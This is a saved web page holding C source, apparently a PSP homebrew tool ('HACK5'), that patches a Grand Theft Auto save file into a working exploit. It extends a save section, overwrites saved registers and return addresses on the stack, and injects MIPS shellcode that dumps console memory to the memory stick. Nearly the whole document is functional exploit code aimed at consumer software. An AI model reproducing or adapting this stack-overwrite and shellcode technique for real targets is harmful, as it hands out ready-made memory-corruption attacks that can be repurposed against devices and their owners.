<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0043)http://www.maxbot.com/gta/private/hack5.cpp -->
<HTML><HEAD>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<META content="MSHTML 6.00.2900.2769" name=GENERATOR></HEAD>
<BODY><PRE>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;ctype.h&gt;
#include &lt;string.h&gt;
#include &lt;assert.h&gt;
#include &lt;wtypes.h&gt;
#include &lt;winerror.h&gt;




#define int64       _int64

int64 FileSize(const char* pszFilename)
{
    DWORD nHigh = 0;

    HANDLE hFile = CreateFile(
        pszFilename,
        GENERIC_READ,                                           // access (read-write) mode
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, // share mode
        NULL,                                                   // pointer to security descriptor
        OPEN_EXISTING,                                          // how to create
        0,                                                      // file attributes
        0);                                                     // handle to file with attributes to copy
    int64 nSize = GetFileSize(hFile, &amp;nHigh);
    CloseHandle(hFile);
    if (nSize == 0xFFFFFFFF)
        return (-1);

    nSize |= ((int64)nHigh) &lt;&lt; 32;
    return (nSize);
}


//
// UK offsets
//
int nUK307 = 0x50;
int nUK330 = 0xC0;





#define DUMP_START  0x08400000
#define DUMP_END    0x0A000000
#define ELF_START   0x08804000






//int fd = sceIoOpen("ms0:/dump.bin", PSP_O_WRONLY|PSP_O_CREAT|PSP_O_TRUNC, 0777);
//sceIoWrite(fd, (char*)DUMP_START, DUMP_END - DUMP_START);
//sceIoClose(fd);
//sceKernelDelayThread(30 * 1000000);



//
// Dump
// uses the game's syscalls instead of syscalling directly
//
unsigned int pcode[] =
{

     0x00000000,  //   nop                                     #
     0x00000000,  //   nop                                     #
     0x00000000,  //   nop                                     #
     0x00000000,  //   nop                                     #



    //int fd = sceIoOpen("ms0:/dump.bin", PSP_O_WRONLY|PSP_O_CREAT|PSP_O_TRUNC, 0777);
     0x27a40010,  //   addiu           a0, sp, $0010           #
     0x34050602,  //   ori             a1, zero, $0602         #      a1=$00000602
     0x0e2c2f7f + nUK307/4,  //   jal             $08b0bdfc               #
     0x340601ff,  //   ori             a2, zero, $01ff         #      a2=$000001ff
     0x0002b825,  //   or              s7, zero, v0            #
     0x00022025,  //   or              a0, zero, v0            #



    //sceIoWrite(fd, (char*)DUMP_START, DUMP_END - DUMP_START);
     0x3c050840,  //   lui             a1, $0840               #      a1=$08400000
     0x0e2c2f61 + nUK307/4,  //   jal             $08b0bd84               #
     0x3c0601c0,  //   lui             a2, $01c0               #      a2=$01c00000



    //sceIoClose(fd);
     0x0e2c2f7b + nUK307/4,  //   jal             $08b0bdec               #
     0x00172025,  //   or              a0, zero, s7            #



    //sceKernelDelayThread(30 * 1000000);
     0x0e2c2f05 + nUK307/4,  //   jal             $08b0bc14               #
     0x3c040200,  //   lui             a0, $0200               #      a0=$02000000



     0x00000000,  //   nop                                     #
     0x0a24d6dc,  //   j               $08935b70               #
     0x00000000,  //   nop                                     #

};





void sw(char* p, int n)
{
    *((int*)p) = n;
}

int lw(char* p)
{
    return (*((int*)p));
}



int nRegion = 0;
#define US 1
#define UK 2


main(int argc, char* argv[])
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    FILE* filein = stdin;
    FILE* fileout = stdout;


    if (argc &lt; 3)
    {
        printf("HACK5 &lt;data.us/data.uk&gt; &lt;data.bin&gt;\n");
        exit(1);
    }


    //
    // Read file
    //
    char* pszFile1 = argv[1];
    filein = fopen(pszFile1, "rb");
    if (!filein)
    {
        fprintf(stderr, "Couldn't open input file\n");
        exit(1);
    }
    int nBytes = FileSize(pszFile1);
    char* pdata = (char*)malloc(nBytes + 500000);
    if (pdata == NULL)
    {
        fprintf(stderr, "malloc failed\n");
        exit(2);
    }
    int nBytesRead = fread(pdata, 1, nBytes, filein);
    printf("reading %s, %d bytes\n", pszFile1, nBytesRead);
    if (nBytesRead != nBytes)
    {
        fprintf(stderr, "fread failed\n");
        exit(3);
    }
    fclose(filein);



    //
    // Region
    //
    nRegion = US;
    if (strstr(pszFile1, "uk") || strstr(pszFile1, "UK"))
        nRegion = UK;

    if (nRegion == US)
    {
        nUK307 = 0;
        nUK330 = 0;
    }
    else
    {
        nUK307 = 0x50;
        nUK330 = 0xC0;
    }






    //
    // In LoadParser
    //
    char* sp = pdata + 8 - 0x10;






    ///////////////////////////
    //
    // Multi call execute code
    //

    //
    // Extend SIMP section
    //
    int nExtend = 12 + 0x0050 + sizeof(pcode);
    sw(pdata + 4, lw(pdata + 4) + nExtend);
    memmove(pdata + 0x00c4 + nExtend, pdata + 0x00c4, nBytes - 0x00c4);
    memset(pdata + 0x00c4, 0, nExtend);
    nBytes += nExtend;







    //
    // lw  s0, $00cc(sp)
    // lw  s1, $00d0(sp)
    // lw  ra, $00d4(sp)
    //



    sw(sp + 0x00cc, 0x02a00008);                              // s0    jr  s5    (s5 = sp + $0040)
    sw(sp + 0x00d0, ELF_START - 0x00000040 + 0x40000000);     // s1    overwrite string, don't cache
    sw(sp + 0x00d4, ELF_START + 0x00106f00);                  // ra



    // Return from LoadParser, now in LoadAndReEstablishPlayer's context
    sp += 0x00e0;



    // Second return
    sw(sp + 0x0018, ELF_START - 0x00000080);  // ra   string memory



    // Filename used by code, remember sp has been advanced by 0x0020
    memcpy(sp + 0x0030, "ms0:/dump.bin", 0x16);


    // Insert code
    memcpy(sp + 0x0040, pcode, sizeof(pcode));










    //
    // Write file
    //
    char* pszFileout = argv[2];
    fileout = fopen(pszFileout, "wb");
    if (!fileout)
    {
        printf("Failed to open out file");
        exit(4);
    }
    printf("%d bytes written to %s\n", fwrite(pdata, 1, nBytes, fileout), pszFileout);
    fclose(fileout);




    free(pdata);
    return (0);
}
</PRE></BODY></HTML>
